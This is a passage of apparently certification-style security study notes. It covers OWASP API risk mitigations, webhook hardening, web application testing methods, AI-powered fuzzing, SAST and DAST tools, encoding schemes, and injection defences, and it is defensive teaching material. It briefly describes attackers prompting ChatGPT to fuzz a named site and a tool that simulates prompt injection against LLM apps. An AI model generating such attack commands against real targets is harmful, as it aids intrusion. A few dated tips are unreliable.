				- Layer Five: The response filter verifies the models generated by the mapper layer. Once the response filter confirms that the records match the user making the API request, the data is returned. This layer also discards any data models that do not explicitly flag the user's account, serving as a final validation step to prevent unauthorized access.
			- By implementing these layered security measures, developers can significantly reduce the risk of API vulnerabilities and protect sensitive business data.
	- API Security Risks and Solutions (owasp.org):
		- API1: Broken Object-Level Authorization:
			- Implement a proper authorization mechanism that enforces user policies and hierarchy.
			- Use the authorization mechanism to verify whether the logged-in user has permission to perform the requested action.
			- Prefer using random and unpredictable values, such as GUIDs, for record IDs.
		- API2: Broken Authentication:
			- Implement anti-brute-force mechanisms to mitigate credential stuffing, dictionary attacks, and brute-force attacks on authentication endpoints.
			- Introduce account lockout or CAPTCHA mechanisms to prevent repeated brute-force attacks on specific user accounts.
			- Enforce weak-password checks to prevent the use of easily guessable credentials.
			- Implement multi-factor authentication (MFA) wherever possible to enhance security.
		- API3: Broken Object Property-Level Authorization:
			- Avoid using generic methods such as to_json() and to_string() to prevent unintentional data exposure.
			- Allow modifications only to object properties that the client is explicitly permitted to update.
			- Minimize returned data structures to include only the necessary fields, based on business or functional requirements for the endpoint.
		- API4: Unrestricted Resource Consumption:
			- Use a solution that enforces resource limits on memory, CPU usage, number of restarts, etc.
			- Implement rate limiting to control how often a client can interact with the API within a defined timeframe.
			- Restrict or throttle the number of times a single API client or user can perform a specific operation.
			- Ensure proper rate-limiting controls are in place to prevent abuse.
		- API5: Broken Function-Level Authorization
			- Avoid inconsistent or weak function-level authorization.
			- Implement a standardized and straightforward authorization mechanism with a default-deny policy.
		- API6: Unrestricted Access to Sensitive Business Flows:
			- Apply appropriate protection mechanisms to business flows that could be exploited if overused.
			- Restrict access from unexpected or unauthorized client devices.
			- Implement CAPTCHA or advanced biometric authentication methods.
			- Analyze user behavior to detect non-human interaction patterns.
			- Consider blocking IP addresses associated with Tor exit nodes and well-known proxies.
		- API7: Server-Side Request Forgery (SSRF):
			- Isolate resource-fetching mechanisms designed to retrieve remote resources.
			- Disable HTTP redirections to prevent exploitation.
			- Use a well-maintained and tested URL parser to mitigate URL parsing inconsistencies.
			- Validate and sanitize all client-supplied input data.
		- API8: Security Misconfiguration:
			- Ensure all API communications occur over an encrypted channel (TLS).
			- Specify the allowed HTTP methods for each API endpoint and disable all others.
			- Implement a proper Cross-Origin Resource Sharing (CORS) policy.
			- Enforce security headers to protect against common vulnerabilities.
			- Ensure all servers in the HTTP request processing chain handle incoming requests consistently to prevent desynchronization issues.
		- API9: Improper Inventory Management:
			- Maintain an up-to-date inventory of all API environments, including production, staging, testing, and development.
			- Use external API security solutions to protect all exposed API versions.
			- Conduct security reviews of all APIs, focusing on function standardization.
			- Rank APIs based on their risk level and enhance security measures for higher-risk APIs.
		- API10: Unsafe Consumption of APIs:
			- Ensure all API interactions take place over a secure communication channel (TLS).
			- Validate and properly sanitize all data received from integrated APIs before processing it.
			- Maintain an allowlist of trusted locations for API redirects and avoid following redirects blindly.
	- Best Practices for API Security:
		- Use Secure Communication: Enforce HTTPS with SSL/TLS certificates to encrypt data between the server and client.
		- Authentication & Authorization: Implement multi-factor authentication (MFA) and protocols like OAuth2 and OpenID Connect. Use tokens to establish trusted identities and control access. Ensure each API request is separately authorized, even from the same user.
		- Input Validation & Data Protection: Sanitize and validate user input to prevent malicious scripts and SQL injection. Use parameterized queries and input validation on the server side.
		- Access Control & Monitoring:
			- Use IP whitelisting to restrict access to trusted users.
			- Implement rate limiting, quotas, and throttling to control API usage.
			- Maintain and analyze access logs to detect anomalies and prevent attacks.
		- Network Security:
			- Use a web application firewall (WAF) with TLS/SSL to block malicious traffic and script injections.
			- Deploy API gateways for authentication, traffic management, and usage analysis.
			- Utilize packet sniffers to detect insecure API calls and unauthorized access.
		- Data Exposure Minimization: Restrict API responses to necessary permissions, avoiding excessive data disclosure in messages or resource replies.
		- Security Testing & Assessments: Conduct regular security audits, penetration testing, and code analysis to identify vulnerabilities.
		- Error Handling & Logging: Implement secure error handling that does not expose sensitive information. Log security events while sanitizing logs to prevent injection attacks.
		- Session & Token Management: Enforce expiration and revocation mechanisms for tokens. Use signatures to verify data integrity and authentication.
		- Advanced API Security Techniques:
			- Use service mesh technology for managing multi-service authentication and access control.
			- Deploy anti-bot measures to block sophisticated automated attacks.
			- Require developers to stay updated on emerging API security risks.
			- Implement security headers like X-Frame-Options, X-XSS-Protection, and Content-Security-Policy.
	- Best Practices for Securing Webhooks:
		- Secure Communication & Authentication:
			- Use HTTPS to encrypt data in transit.
			- Implement webhook signing with HMAC-based signatures and constant-time comparison to verify message integrity.
			- Use mutual TLS and API keys to authenticate webhook requests.
		- Access Control & Validation:
			- Restrict webhook calls to authorized sources by verifying source IP addresses or using DNS resolution.
			- Ensure firewalls reject unauthorized webhook requests.
			- Limit webhook payload sizes to mitigate denial-of-service (DoS) attacks.
		- Replay Attack & Timing Protection:
			- Track unique event IDs to prevent duplicate processing.
			- Compare webhook timestamps with the current time to block timing attacks.
		- Rate Limiting & Traffic Management:
			- Enforce rate limiting to control incoming and outgoing webhook traffic.
			- Use a webhook proxy service for queuing, inspecting, transforming, and retrying webhook calls.
		- Event Handling & Logging:
			- Ensure event processing is idempotent to prevent duplicate event execution.
			- Respond with 200 OK for successful processing to avoid webhook deactivation.
			- Log webhook events for debugging and auditing.
		- Security & Storage Best Practices:
			- Store tokens securely using store_hash instead of user data.
			- Avoid sending confidential information via webhooks; use secure APIs instead.
			- Ensure webhook URLs support HTTP HEAD for retrieving meta-information without full content transfer.
- Web Application Security:
	- Web Application Security Testing:
		- Web application security testing is the process of assessing an application's security and performance while generating timely reports on its security posture and potential threats. It is typically conducted by security professionals and developers to identify and mitigate vulnerabilities using the following techniques:
			- Manual Web Application Security Testing:
				- Manual security testing involves assessing a web application using custom-designed data, tailored code, and browser extension tools such as SecApps to detect vulnerabilities and weaknesses. It primarily focuses on business logic errors and threat analysis.
				- Security professionals also use tools like Selenium, Apache JMeter, LoadRunner, QTP, Bugzilla, and Acunetix to perform manual testing.
			- Automated Web Application Security Testing:
				- Automated security testing involves using tools to streamline the testing process, allowing for the rapid and systematic discovery of vulnerabilities. These automated methods are integrated into each development stage to provide continuous feedback. Any changes in the code are analyzed, and developers are instantly notified if vulnerabilities are detected.
				- Security professionals use tools such as Ranorex Studio, TestComplete, Leapwork, Katalon Studio, and Testsigma for automated testing.
			- Static Application Security Testing (SAST):
				- Static Application Security Testing, also known as white-box testing, involves analyzing an application's complete architecture, including its source code, which is fully accessible to the tester. SAST tools help developers identify and report design flaws that could lead to security vulnerabilities. Additionally, SAST ensures that source code complies with defined security standards and best practices.
				- Security professionals use tools such as Codacy, JFrog, Klocwork, Checkmarx One, and PT Application Inspector for SAST.
			- Dynamic Application Security Testing (DAST):
				- In contrast to SAST, Dynamic Application Security Testing (DAST), or black-box testing, is performed without prior knowledge of the system's internal architecture. DAST tools analyze running applications to identify security flaws related to interfaces, request/response handling, session management, authentication mechanisms, and code injections. These tools also utilize fuzzing, which involves sending unexpected or unvalidated test cases to a web application to expose potential vulnerabilities.
				- Security professionals use tools such as Invicti, Acunetix Vulnerability Scanner, HCL AppScan, OpenText Fortify On Demand, and StackHawk to conduct DAST.
	- Web Application Security Methods:
		- Web Application Fuzz Testing:
			- Web application fuzz testing (fuzzing) is a black-box testing method used for quality assurance and security assessment. It helps identify coding errors and security vulnerabilities in web applications. Fuzz testing tools (fuzzers) generate large amounts of random data, known as “fuzz,” which is then used against the target web application to uncover potential weaknesses that attackers could exploit.
			- Cybercriminals use various attack techniques to crash web applications and cause disruption in the shortest time possible. To counteract this, security professionals and web developers use fuzz testing to assess the robustness and resilience of applications against threats such as buffer overflow, denial-of-service (DoS), cross-site scripting (XSS), and SQL injection.
			- Steps of Fuzz Testing:
				- Web application fuzz testing involves the following steps:
				- Identify the target system – Determine the web application or component to be tested.
				- Identify inputs – Locate input fields, APIs, and other data entry points.
				- Generate fuzzed data – Create random or malformed input data.
				- Execute the test using fuzz data – Inject the fuzzed data into the application.
				- Monitor system behavior – Observe how the application responds to unexpected inputs.
				- Log defects – Record and analyze any vulnerabilities or crashes found during testing.
			- Fuzz Testing Strategies:
				- Mutation-Based: This type of fuzz testing generates new test data by modifying existing data samples. The process starts with a valid input, which is then repeatedly mutated to create further random variations until the target is reached.
				- Generation-Based: In this approach, new test data is generated from scratch based on predefined rules and models. The amount of data to be generated is determined beforehand according to the testing model.
				- Protocol-Based: This method involves using a protocol fuzzer to send forged packets to the target application. It requires in-depth knowledge of the protocol being tested. Testers define a list of protocol specifications, which the fuzzer uses to perform model-based test generation, introducing irregularities in data content, sequence, and other protocol parameters.
			- Fuzz Testing Scenario: An attack script is fed into the fuzzer, which then translates these attacks into HTTP requests directed at the target application. The target responds to these HTTP requests, and all requests and responses are logged for manual inspection.
			- Fuzz Testing Tools:
				- WebScarab (owasp.org)
				- Burp Suite (portswigger.net)
				- AppScan Standard (www.hcl-software.com)
				- Defensics (www.synopsys.com)
				- ffuf (github.com)
		- Web Application Fuzz Testing with AI:
			- AI has made it easier for attackers to conduct fuzz testing on target web applications. For example, an attacker can leverage AI-powered tools, such as ChatGPT, to generate attack commands.
			- A simple prompt like: "Fuzz the target URL www.moviescope.com using the Wfuzz tool." can produce automated fuzzing instructions.
			- In this case, the wfuzz command is used to brute-force directory and file names. The tool systematically tests each directory or filename in the wordlist against the target website’s paths while filtering out 404 (Not Found) responses.
		- AI-Powered Fuzz Testing:
			- AI-powered fuzz testing represents a major advancement in automated vulnerability discovery, surpassing traditional fuzzing methods in efficiency and effectiveness.
			- Key Features of AI-Powered Fuzz Testing:
				- Automated Generation of Complex Inputs: AI-driven fuzz testing leverages machine learning to generate diverse and complex inputs intelligently. Unlike traditional fuzzing, which relies on random or mutation-based inputs, AI crafts inputs that are more likely to trigger specific code paths and expose vulnerabilities.
				- Pattern Recognition and Predictive Input Selection: By analyzing past tests and software reactions, AI can identify patterns and predict the most effective inputs to uncover critical bugs. This predictive capability enhances efficiency by reducing ineffective tests and focusing on inputs with a higher likelihood of revealing vulnerabilities.
				- Continuous Learning and Adaptive Testing: AI-powered fuzz testing continuously learns from real-time feedback, dynamically refining its input generation strategies. As it discovers new vulnerabilities or explores deeper code paths, it adapts its approach to further investigate similar areas, uncovering hidden issues that traditional methods may miss.
				- Improved Testing Efficiency and Coverage: AI enhances testing efficiency by prioritizing high-risk areas of code, saving development time and resources. By systematically exploring the codebase using learned patterns and predictive models, AI-powered fuzz testing achieves broader and deeper code coverage compared to traditional fuzzing techniques.
			- AI-Powered Fuzz Testing Tool: Prompt Fuzzer:
				- Prompt Fuzzer is an advanced AI-powered fuzz testing tool designed for GenAI applications. It enhances system prompt security by simulating real-world attacks, such as prompt injections, and leveraging LLMs to analyze responses and assign security scores.
				- Ethical hackers can use Prompt Fuzzer in an interactive playground to iteratively test and refine prompts, strengthening the application's defenses against vulnerabilities. This iterative process helps identify and mitigate security risks arising from the interaction between system prompts and LLM responses.
				- Beyond detecting existing vulnerabilities, Prompt Fuzzer raises awareness of potential risks in GenAI systems, promoting better security practices. It also helps ethical hackers prioritize their efforts by pinpointing critical weaknesses in system prompts and their interactions with LLMs.
				- Using a dynamic testing method tailored to GenAI prompts, Prompt Fuzzer adjusts the fuzzing process based on contextual information extracted from system prompts. This ensures comprehensive security testing, improving prompt resistance to advanced attacks and enhancing overall security in GenAI applications.
		- AI-Powered Static Application Security Testing (SAST):
			- AI-powered SAST represents a significant advancement in application security by leveraging machine learning (ML) and advanced algorithms to enhance traditional code analysis. By integrating AI into SAST, organizations can strengthen the software development lifecycle with a more robust and proactive security approach.
			- Enhanced Pattern Recognition and Anomaly Detection: AI-powered SAST tools utilize machine learning algorithms to analyze vast amounts of code and identify subtle patterns and anomalies that may indicate vulnerabilities. Unlike traditional rule-based approaches, AI enables the detection of previously unknown vulnerabilities that have not yet been documented or patched.
			- Zero-Day Vulnerability Detection: A key advantage of AI-powered SAST is its ability to identify zero-day vulnerabilities. By analyzing code patterns and behaviors, AI algorithms can detect potential security threats before they are exploited, providing a crucial layer of proactive defense.
			- Automated Code Analysis and Immediate Feedback: AI-driven SAST tools offer real-time feedback to developers as they write code, highlighting potential security issues and suggesting fixes on the fly. This immediate feedback loop helps developers address vulnerabilities early in the development cycle, significantly reducing the cost and complexity of remediation.
			- Reduced False Positives and False Negatives: AI-powered SAST leverages natural language processing (NLP) techniques to understand the context of the code, significantly improving accuracy. This minimizes false positives and false negatives, ensuring security teams focus on genuine threats and optimize their efforts to enhance overall application security.
			- AI-powered SAST tools can also integrate threat intelligence feeds, enabling them to adapt and detect emerging threats in real time. This adaptability ensures that SAST remains an effective defense mechanism against evolving security risks.
			- By harnessing AI’s capabilities in pattern recognition, anomaly detection, automation, and continuous learning, AI-powered SAST tools empower organizations to build more secure and resilient software. This transformative technology is not just an incremental improvement but a fundamental shift in how we approach application security, ensuring a safer and more robust digital landscape.
			- AI-Powered Static Application Security Testing (SAST) Tools:
				- Code Genie AI (www.rohanhall.com):
					- Code Genie AI is an innovative solution that leverages artificial intelligence to enhance the security and resilience of smart contracts. By integrating AI into SAST, it transforms vulnerability detection and remediation within the blockchain ecosystem.
					- Key Features:
						- Automated Vulnerability Scanning: Code Genie AI automates the often tedious and error-prone process of manually reviewing smart contract code. Its AI-powered engine quickly scans for potential vulnerabilities and security flaws with remarkable accuracy.
						- Advanced Pattern Recognition: Utilizing machine learning algorithms trained on extensive datasets of known vulnerabilities and secure coding practices, Code Genie AI excels at identifying subtle patterns and anomalies that may indicate potential weaknesses.
						- Prioritized Risk Assessment: Code Genie AI evaluates the severity and potential impact of each identified issue, enabling developers to prioritize remediation efforts effectively. This ensures that critical vulnerabilities are addressed first, minimizing security risks promptly.
						- Actionable Recommendations: Beyond merely identifying vulnerabilities, Code Genie AI provides developers with actionable recommendations and guidance to remediate each issue efficiently.
				- Codiga (www.codiga.io):
					- Codiga's AI-powered static code analysis platform combines customizable rules, automated vulnerability detection, real-time feedback, and adherence to industry standards, enabling organizations to identify and mitigate security risks proactively.
					- Key Features:
						- Customizable Static Code Analysis with AI: Codiga leverages AI to provide real-time feedback and improvement suggestions directly within integrated development environments (IDEs), ensuring a seamless and efficient development experience.
						- Automated Vulnerability Detection and Fixes: Codiga’s AI-powered engine automates vulnerability detection, reducing the risk of human error and accelerating issue identification. In addition to flagging potential security flaws, it offers automated fixes, streamlining remediation and speeding up the development cycle.
				- Corgea (corgea.com): Corgea is an innovative AI-powered SAST tool that automates the generation of precise fixes, streamlines the remediation process, and ensures code integrity.
				- Checkmarx SAST (checkmarx.com): Checkmarx CxSAST is a SAST solution that leverages AI to automate and streamline the vulnerability remediation process.
				- Snyk Code (snyk.io): Snyk Code, powered by DeepCode AI, is a SAST tool that utilizes purpose-built AI trained on security-specific data and curated by top security researchers, ensuring unmatched accuracy and reliability.
				- CodeThreat (www.codethreat.com): CodeThreat is a groundbreaking AI-driven application security testing platform designed to empower developers and security teams in building more reliable and secure embedded software. By leveraging AI-driven white-box fuzz testing, it enables early detection of critical bugs and vulnerabilities.
				- DryRun Security (www.dryrun.security): DryRun Security is a powerful AI-powered SAST tool that prioritizes contextual security analysis and generative AI, enabling developers to write more secure code.
				- Code Intelligence (www.code-intelligence.com): Code Intelligence is an AI-powered SAST platform designed to enhance the security of embedded software systems. By utilizing AI and fuzz testing, it helps developers uncover hidden vulnerabilities and bugs early in the development lifecycle, ultimately improving software reliability and resilience.
		- AI-Powered Dynamic Application Security Testing (DAST):
			- AI-powered DAST leverages machine learning (ML) and advanced algorithms to automate and enhance the process of identifying vulnerabilities in running applications. By simulating real-world attack scenarios and analyzing application behavior, AI-powered DAST provides a more comprehensive security assessment. Traditional DAST tools, however, often struggle with accuracy when responding to modern attacks.
			- Key Benefits of AI-Powered DAST:
				- Simulating Complex Attack Scenarios: AI can analyze application behavior and responses, dynamically adapting testing strategies to explore intricate attack vectors and exploit paths.
				- Increased Detection Accuracy: AI-powered analysis reduces false positives, leading to a more focused and efficient vulnerability detection process. AI-powered DAST tools can identify common vulnerabilities with greater precision.
				- Intelligent Test Case Generation and Prioritization: Traditional DAST tools rely on predefined test cases that may overlook unique vulnerabilities. AI analyzes application behavior and user interactions to generate dynamic test cases, focusing on high-risk areas. This prioritization ensures efficient testing by targeting critical vulnerabilities first.
				- Reduced False Positives with Context-Aware Analysis: DAST tools can generate numerous false positives, overwhelming security teams. AI-powered DAST incorporates techniques such as natural language processing (NLP) to understand application behavior in context. This helps distinguish real threats from benign actions, improving the accuracy of findings.
				- Self-Learning and Adaptation: AI algorithms continuously learn from past testing data and successful attacks, enabling DAST tools to refine their testing strategies and detect emerging threats more effectively. This self-learning capability ensures DAST remains relevant in an evolving cybersecurity landscape.
				- Automation and Integration with Development Pipelines: AI automates repetitive tasks in DAST, such as test execution and initial vulnerability analysis, allowing security teams to focus on complex issues and remediation strategies. Additionally, AI-powered DAST seamlessly integrates with development pipelines, enabling "shift-left" security by incorporating security testing early in the development cycle.
			- AI-powered DAST represents a significant advancement in application security testing, providing a more realistic and effective approach to identifying and mitigating vulnerabilities. By leveraging AI, organizations can strengthen the security of their web applications and stay ahead of evolving cyber threats.
			- AI-Powered Dynamic Application Security Testing (DAST) Tool:
				- ZeroThreat.ai (zerothreat.ai):
					- ZeroThreat.ai is an advanced AI-powered DAST tool designed to identify and mitigate vulnerabilities in real time. Unlike traditional static analysis tools, ZeroThreat.ai actively interacts with running applications, simulates attacks, and detects potential security weaknesses that could be exploited by malicious actors. By leveraging machine learning algorithms, it continuously adapts to evolving threats and provides comprehensive, context-aware security assessments.
					- Key Features of ZeroThreat.ai:
						- Intelligent Crawling: ZeroThreat employs an AI-driven crawler designed to navigate complex web applications and APIs with speed and precision, ensuring thorough exploration and vulnerability detection.
						- Threat Intelligence Integration: ZeroThreat incorporates real-time threat intelligence feeds, enabling it to detect anomalies and identify emerging threats by analyzing application behavior. By understanding the latest attack vectors, it proactively mitigates potential security risks.
						- Minimized False Positives: ZeroThreat’s AI capabilities significantly reduce false positives, allowing security teams to focus on genuine vulnerabilities and prioritize effective remediation. This enhanced accuracy makes it a valuable tool for ethical hacking and penetration testing.
						- Seamless Integration: ZeroThreat easily integrates with existing CI/CD pipelines, enabling automated security testing throughout the development lifecycle.
						- Fast Scanning Speeds: With AI-powered scanning, ZeroThreat rapidly identifies critical vulnerabilities, allowing developers and security teams to address risks early and minimize the exposure window for potential attacks.
				- AI-Powered Dynamic Application Security Testing (DAST) Tools:
					- VoltSec.io (www.voltsec-io.com): VoltSec.io combines AI-driven analysis with the expertise of certified ethical hackers. This collaborative approach ensures that vulnerabilities are not only identified but also thoroughly analyzed and prioritized based on risk severity. Ethical hackers leverage AI findings to conduct deeper assessments, providing actionable insights and a clearer understanding of the security posture.
					- AppCheck (appcheck-ng.com): AppCheck is a vulnerability scanning tool designed for large-scale automated penetration testing. It leverages advanced AI algorithms to deliver comprehensive and efficient vulnerability detection.
					- Aptori (aptori.dev): Aptori begins its security assessment with a reconnaissance phase, during which AI algorithms gather and analyze information about the target system or network from multiple sources. This intelligence helps identify potential attack vectors that malicious actors might exploit.
					- Pentest Copilot (copilot.bugbase.ai): Pentest Copilot utilizes AI to streamline penetration testing by automating security assessments, providing real-time vulnerability detection, and generating detailed security reports.
					- Hackules (www.hackules.com): Hackules enhances web application security testing by leveraging AI to automate vulnerability detection and prioritize critical issues, making security assessments more efficient for security professionals.
					- Beagle Security (www.beaglesecurity.com): Beagle Security focuses on automated vulnerability assessments for web applications. By integrating with CI/CD pipelines, it enables continuous testing, delivers detailed vulnerability reports, and provides remediation guidance, ensuring robust security throughout the development lifecycle.
					- Veracode (www.veracode.com): Veracode is a leading application security platform that combines static, dynamic, and software composition analysis to proactively identify vulnerabilities in software. By integrating automated testing into the development process, it enables early detection and remediation of security flaws. Veracode provides comprehensive scanning, detailed reports, and remediation guidance to strengthen an organization’s overall application security posture.
					- Vigilocity (www.vigilocity.com): Vigilocity prioritizes real-time security monitoring and incident response. It leverages advanced threat intelligence for swift detection and mitigation of security incidents. By providing comprehensive threat visibility, automated response capabilities, and detailed incident reports, Vigilocity enhances overall cybersecurity resilience.
					- DevOps Security (www.devops.security): DevOps Security seamlessly integrates security practices into the DevOps lifecycle. It offers automated vulnerability scanning, secret management, and access control to proactively mitigate security risks. By fostering collaboration between development, security, and operations teams, it ensures secure software delivery while maintaining the agility of DevOps processes.
		- Source Code Review:
			- Source code reviews are conducted to detect bugs and irregularities in web applications. They can be performed manually or using automated tools to identify specific areas in the application code related to authentication, session management, and data validation. These reviews help uncover unvalidated data vulnerabilities and poor coding practices that could allow attackers to exploit the application.
			- Manual Code Review: A manual code review involves developers or security experts analyzing the source code line by line to identify security flaws, logical errors, and coding inefficiencies that automated tools might miss.
			- Automated Code Review: An automated code review uses specialized tools to scan the source code for vulnerabilities, inconsistencies, and adherence to coding standards, improving efficiency and reducing human error.
		- Encoding Schemes:
			- Encoding is the process of converting source information into its equivalent symbolic form, helping to obscure the meaning of the data. At the receiving end, the encoded data is decoded back into plaintext format. Decoding is the reverse process of encoding. Web applications use different encoding schemes to safely handle unusual characters and binary data as intended.
			- Types of Encoding Schemes:
				- URL Encoding:
					- Web browsers and servers allow URLs to contain only printable ASCII characters for proper addressing. URL encoding converts a URL into a valid ASCII format so that data can be safely transmitted over HTTP. Some characters have special meanings in the URL scheme or HTTP protocol and are therefore restricted. URL encoding replaces these characters with "%" followed by their two-digit ASCII code in hexadecimal format.
					- Examples:
						- %3D => =
						- %0A => New line
						- %20 => Space
				- HTML Encoding:
					- HTML encoding represents special characters in a way that allows them to be safely used within an HTML document. Since certain characters define the structure of the document, using them directly may cause issues. HTML encoding replaces these characters with predefined HTML entities.
					- Examples:
						- &amp; => &
						- &lt; => <
						- &gt; => >
				- Unicode Encoding:
					- Unicode encoding exists in two primary forms: 16-bit Unicode encoding and UTF-8.
					- 16-bit Unicode Encoding:
						- Replaces special Unicode characters with "%u" followed by the character’s Unicode code point in hexadecimal format.
						- Example: %u2215 => /
					- UTF-8 Encoding:
						- A variable-length encoding standard where each byte is expressed in hexadecimal format and prefixed with "%".
						- Examples:
							- %C2%A9 => ©
							- %E2%89%A0 => ≠
				- Base64 Encoding:
					- Base64 encoding represents binary data using only printable ASCII characters. It is commonly used for encoding email attachments for safe transmission over SMTP and for encoding user credentials.
					- Example:
						- The binary value of "cake" is: 01100011 01100001 01101011 01100101
						- Converting this binary value to Base64 encoding: 01011001 00110010 01000110 01110010 01011010 01010001 00111101 00111101
				- Hex Encoding:
					- Hex encoding represents each character using its hexadecimal value, making it useful for transmitting binary data.
					- Examples:
						- "Hello" => 48 65 6C 6C 6F
						- "Jason" => 4A 61 73 6F 6E
		- Whitelisting vs. Blacklisting Applications:
			- Web applications play a crucial role in the global adoption of digital transformation. However, their rapid development has also motivated attackers to exploit vulnerabilities and security breaches within these applications. To counter such threats, security professionals must implement robust security policies and testing strategies. Whitelisting and blacklisting is one such strategy that helps secure applications, networks, and infrastructures. This approach allows organizations to define which entities should be permitted and which should be blocked, effectively preventing malicious software from infiltrating the network.
			- Application Whitelisting:
				- Application whitelisting involves creating a list of approved application components—such as software libraries, plugins, extensions, configuration files, or legitimate software—that are allowed to execute within a system. This technique helps prevent unauthorized execution and the spread of malicious programs.
				- Additionally, it restricts the installation of unapproved or vulnerable applications. Whitelisting provides enhanced security by protecting web applications against ransomware and other malware attacks.
			- Application Blacklisting:
				- Application blacklisting involves identifying and blocking malicious applications or software that should not be executed within a system or network. By preventing harmful applications from running, blacklisting helps mitigate potential threats. However, this method is threat-centric and may not effectively detect modern or evolving threats, increasing the risk of attacks and data breaches.
				- To maintain security, blacklists must be updated regularly to defend against emerging malware threats. Blacklisting can be implemented by blocking specific applications at the firewall level or using specialized security software.
			- Whitelisting and Blacklisting for Basic URL Management:
				- URL blacklisting prevents users from accessing specific web pages that are deemed unsafe or malicious. Users can browse all URLs except those explicitly listed in the blacklist.
				- URL whitelisting restricts access to only specific URLs, preventing users from visiting any other sites outside the allowed list.
				- Methods of URL Whitelisting:
					- Allow access to all URLs except blocked ones – Users can access the entire network except for specifically restricted URLs.
					- Block access to all URLs except permitted ones – Only predefined URLs are accessible, limiting users to a small, approved list.
					- Define exceptions to strict blacklists – Specific schemes, subdomains, paths, or ports can be whitelisted within an otherwise restrictive blacklist.
					- Allow browsers to open applications – Whitelisting applies only to particular external protocol handlers, allowing the browser to automatically execute approved applications.
				- Methods of URL Blacklisting:
					- Allow access to all URLs except blocked ones – Users are restricted from visiting certain websites flagged as malicious.
					- Block access to all URLs except permitted ones – Only a select list of safe URLs is accessible, preventing access to all other websites.
					- Define exceptions to strict blacklists – Restricts access to URLs known to be vulnerable to cyber threats.
					- Prevent browsers from opening applications – Blacklisting ensures that the browser does not automatically execute untrusted applications.
			- Application Whitelisting and Blacklisting Tools:
				- ManageEngine Application Control Plus (www.manageengine.com): ManageEngine Application Control Plus automates the process of adding applications to whitelists and blacklists based on predefined control rules. Its built-in Endpoint Privilege Management feature enables organizations to enforce the principle of least privilege (PoLP) and adopt a zero-trust security model by ensuring that only authorized users can access applications and their associated privileges.
				- BitDefender (www.bitdefender.com)
				- Cisco Umbrella (umbrella.cisco.com)
				- Symantec Endpoint Application Control (www.broadcom.com)
				- BrowseControl (www.currentware.com)
				- Sucuri WAF (sucuri.net)
		- Application Content Filtering Tools:
			- Content filtering tools are software or hardware solutions designed to regulate and manage access to web content based on predefined criteria. These tools enable organizations to enforce internet usage policies by blocking or allowing access to specific websites, applications, or types of content.
			- TitanHQ WebTitan (www.titanhq.com): WebTitan helps security professionals eliminate malicious content at the source by blocking malware, phishing attempts, viruses, ransomware, and access to malicious sites. It allows organizations to define URL filtering policies and control internet access for users or groups, enabling the blocking or allowance of specific URLs or websites.
			- NG Firewall Complete (edge.arista.com)
			- Smoothwall Filter (smoothwall.com)
			- FortiGuard URL Filtering Service (www.fortinet.com)
			- Barracuda Web Security Gateway (www.barracuda.com)
			- OpenDNS (www.opendns.com)
	- Defend Against Injection Attacks:
		- SQL Injection Attacks:
			- Limit user input length and validate/sanitize all inputs.
			- Avoid dynamic SQL; use prepared statements, parameterized queries, or stored procedures.
			- Implement whitelisting instead of blacklisting for input validation.
			- Perform proper escaping and character filtering to mitigate special characters (e.g., single quotes).
			- Use type-safe variables/functions (e.g., isNumeric()) to enforce data integrity.
			- Utilize Object-Relational Mapping (ORM) frameworks to automatically handle queries securely.
			- Restrict database privileges—use low-privileged accounts and avoid admin-level access.
			- Disable unnecessary database functionalities (e.g., xp_cmdshell, extended stored procedures).
			- Isolate the database server from the web server.
			- Monitor and audit database traffic, logs, and privileges regularly.
			- Use firewalls (WAF), IDS, and vulnerability scanners to detect potential threats.
			- Customize error messages to prevent information disclosure (e.g., use "RemoteOnly" for detailed errors locally).
			- Regularly update and patch applications, database servers, and operating systems.
			- Ensure secure development practices, educating developers on SQL injection risks.
			- Avoid shared databases and using the same account for multiple databases.
			- Use secure authentication methods and enforce minimum privilege principles for database access.
		- Defending Against Command Injection Flaws:
			- The best defense against command injection is avoiding direct execution of shell commands whenever possible. Many programming languages offer built-in libraries that perform the same functions without invoking the OS shell interpreter, reducing security risks. When executing system calls is unavoidable (e.g., database queries), all input must be strictly validated and sanitized to ensure it does not contain malicious content.
			- Applications should be designed to treat all user-supplied parameters as data, not executable code. Using prepared statements, stored procedures, and safe APIs helps enforce this principle. Running web applications and database connections with least-privileged accounts prevents attackers from gaining administrative control. Additionally, error handling should be robust, checking return codes, timeouts, and failures to detect anomalies early.
			- Countermeasures Against Command Injection:
				- Perform strict input validation using whitelisting for allowed characters.
				- Escape dangerous characters properly, but never rely on escaping as the sole defense.
				- Use language-specific libraries that eliminate the need for OS shell commands.
				- Encode both input and output to prevent unintended execution.
				- Utilize safe APIs that avoid interacting with the system interpreter.
				- Structure requests to ensure parameters are treated strictly as data.
				- Use parameterized SQL queries instead of dynamically constructing commands.
				- Avoid direct OS command execution (e.g., exec, system) without strict validation.
				- Prefer built-in library functions over shell commands for common operations.
				- Enforce least privilege—never run web servers as root or databases as DBADMIN.
				- Implement security-focused frameworks (e.g., using Python over PHP).
				- Scan applications with dynamic web vulnerability scanners.
				- Utilize content security policy (CSP) headers for additional protection.
				- Use security libraries and frameworks specifically designed for secure command execution.
				- Where possible, avoid shell commands altogether in favor of safer language-specific alternatives.
		- Defending Against LDAP Injection Attacks:
			- LDAP injection attacks exploit user input to manipulate LDAP queries, potentially granting unauthorized access to sensitive data such as usernames and passwords. To mitigate these risks, follow these countermeasures:
			- Validate all input data (type, pattern, and domain value) to prevent malicious entries.
			- Sanitize and escape special characters (e.g., *, (, ), \, &, |) before incorporating input into queries.
			- Avoid string concatenation when constructing LDAP search filters.
			- Use specific LDAP filters and AND filters to enforce restrictions.
			- Restrict and validate the amount of data returned to users.
			- Implement tight access control on LDAP directory data.
			- Enforce RBAC (Role-Based Access Control) to limit user access.
			- Use LDAPS (LDAP over SSL) to encrypt and secure communication.
			- Configure LDAP with bind authentication and use least-privileged service accounts for LDAP queries.
			- Avoid using highly privileged accounts for LDAP interactions.
			- Perform dynamic testing and source code analysis to detect vulnerabilities.
			- Use security-focused libraries and frameworks that provide built-in protection.
			- Monitor LDAP traffic and audit logs for suspicious activity.
			- Leverage SaaS-based security testing services to identify LDAP injection threats.
		- Defending Against File Injection Attacks:
			- File injection attacks allow attackers to upload and execute malicious files on a server, leading to data theft, manipulation, or persistent control. To mitigate these risks, follow these countermeasures:
			- Strictly validate user input and maintain a whitelist for allowed file types and size limits.
			- Limit file uploads to necessary types only and validate file MIME types.
			- Disable remote file inclusion if not required.
			- Store uploaded files outside the web root to prevent direct access via URL.
			- Rename uploaded files using secure random functions to avoid predictable names.
